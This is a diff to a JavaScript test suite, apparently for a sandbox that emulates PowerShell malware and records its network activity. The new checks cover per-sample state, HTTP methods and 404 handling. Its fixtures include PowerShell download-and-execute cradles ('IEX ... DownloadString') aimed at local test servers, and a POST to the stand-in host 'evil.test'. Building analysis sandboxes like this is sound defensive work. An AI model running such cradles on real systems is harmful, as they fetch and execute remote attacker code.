@@ -71,7 +71,19 @@ const realistic = createServer((q, r) =>
   r.writeHead(200, { "content-type": "text/plain" }).end("Write-Host 'LIVE-NOCORS-RAN'"),
 );
 
+// Permissive about CORS and unsuccessful anyway, which is what an error page
+// from a reachable host looks like.
+const missing = createServer((q, r) =>
+  r
+    .writeHead(404, {
+      "content-type": "text/html",
+      "access-control-allow-origin": "*",
+    })
+    .end("<html>not found</html>Write-Host 'ERRORPAGE-RAN'"),
+);
+
 await new Promise((ok) => engine.listen(4229, () => ok(undefined)));
+await new Promise((ok) => missing.listen(4233, () => ok(undefined)));
 await new Promise((ok) => permissive.listen(4231, () => ok(undefined)));
 await new Promise((ok) => realistic.listen(4232, () => ok(undefined)));
 
@@ -102,7 +114,11 @@ const run = (script, supplied = [], mode = "blocked") =>
     ([s, sup, m]) => {
       globalThis.resetDownloads();
       globalThis.setNetworkMode(m);
+      // All three ledgers, exactly as the worker drains them. The boundary one
+      // is here because leaving it out is what let one sample's network
+      // records turn up in the next sample's report.
       globalThis.proxyCalls();
+      globalThis.drainBoundary();
       globalThis.snapshotFs();
       for (const [k, v] of sup) globalThis.supplyDownload(k, v);
       const r = globalThis.runFixture(s);
@@ -231,8 +247,71 @@ check(
   JSON.stringify(o.calls.filter((c) => c.source === "boundary")),
 );
 
+// ---------------------------------------------------------------------------
+// The four defects a code review found after the first version of this probe
+// passed 17 checks. Every one of them lives in state that survives a run, or
+// in live mode - and every case above runs once, in blocked mode. That was the
+// hole, so these are cross-run and live on purpose.
+// ---------------------------------------------------------------------------
+
+// The sample's verb, not an assumed GET. Recording GET for a POST tells the
+// analyst the wrong thing, and in live mode sends the wrong request.
+o = await run("Invoke-WebRequest -Uri 'http://evil.test/p' -Method POST", [["p", "x"]]);
+check(
+  "method: a POST is recorded as POST",
+  outcomes(o).includes("POST"),
+  JSON.stringify(outcomes(o)),
+);
+
+// One sample's network records must not appear in the next one's report.
+await run("IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:4231/s.ps1')", [], "live");
+o = await run("Write-Host 'second sample'");
+check(
+  "boundary: the previous run's URLs are gone",
+  !o.calls.some((c) => JSON.stringify(c).includes("4231")),
+  JSON.stringify(o.calls),
+);
+
+// Reset clears what belongs to the sample. The network mode belongs to the
+// session, and clearing it here left the JS boundary and this resolver
+// disagreeing about whether the network was open.
+o = await page.evaluate(() => {
+  globalThis.setNetworkMode("live");
+  globalThis.resetDownloads();
+  globalThis.proxyCalls();
+  globalThis.drainBoundary();
+  globalThis.snapshotFs();
+  const r = globalThis.runFixture(
+    "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:4231/s.ps1')",
+  );
+  const calls = globalThis.hostCalls();
+  globalThis.proxyCalls();
+  globalThis.drainBoundary();
+  return { r, calls, dropped: [] };
+});
+check(
+  "mode: resetting downloads does not close the network behind the host's back",
+  o.r.output.includes("LIVE-CORS-RAN"),
+  `${o.r.output} | ${o.r.error}`,
+);
+
+// An error page is not a stage, even from a host that allows the read.
+o = await run("IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:4233/s.ps1')", [], "live");
+check(
+  "status: a 404 body is not executed as a stage",
+  !o.r.output.includes("ERRORPAGE-RAN"),
+  o.r.output,
+);
+check(
+  "status: the 404 is recorded rather than swallowed",
+  o.calls.some((c) => String(c.outcome ?? "").includes("404")) ||
+    outcomes(o).some((a) => a.includes("no body")),
+  JSON.stringify(o.calls.map((c) => [c.source, c.outcome, c.args])),
+);
+
 await browser.close();
 engine.close();
+missing.close();
 permissive.close();
 realistic.close();
 
